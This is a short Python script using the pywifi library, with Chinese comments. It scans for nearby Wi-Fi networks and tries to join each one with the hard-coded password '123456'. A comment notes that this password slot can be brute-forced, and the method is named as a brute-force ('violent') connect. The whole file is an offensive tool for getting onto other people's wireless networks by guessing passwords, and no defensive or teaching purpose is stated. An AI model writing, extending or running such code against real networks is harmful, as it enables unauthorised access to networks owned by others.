import time
import pywifi
from pywifi import const


class WifiConnect(object):
    # pywifi: https://github.com/awkman/pywifi/blob/master/DOC.md

    def __init__(self) -> None:
        wifi = pywifi.PyWiFi()
        self.interface = wifi.interfaces()[0]  # 网卡接口
        self.interface.disconnect()  # 断开网卡
        assert self.interface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def scan_get_ssid(self):
        """扫描WIFI信号获得ssid"""

        self.interface.scan(), time.sleep(3)  # 扫描WIFI信号(等待3秒)
        results = self.interface.scan_results()  # 扫描结果
        for index, profile in enumerate(results):
            ssid = profile.ssid
            print('{}.扫描到WIFI:[{}],信号强度(绝对值越小越强):[{}],Mac地址:[{}]——'
                  .format(index + 1, ssid, profile.signal, profile.bssid), end='')
            yield ssid

    def violent_connect(self):
        """尝试暴力连接wifi"""

        profile = pywifi.Profile()
        for ssid in self.scan_get_ssid():
            # 定义连接配置
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN  # 密码认证
            profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 加密类型
            profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
            profile.key = '123456'  # 连接密码(可暴力破解)

            # 删除配置并添加自定义配置
            self.interface.remove_all_network_profiles()
            profile_connect = self.interface.add_network_profile(profile)

            # 尝试进行连接(每次休眠5秒)
            self.interface.connect(profile_connect), time.sleep(5)
            if self.interface.status() == const.IFACE_CONNECTED:
                print("连接成功")
                break
                # self.interface.disconnect()
            else:
                print("连接失败")


if __name__ == '__main__':
    wfc = WifiConnect()
    wfc.violent_connect()
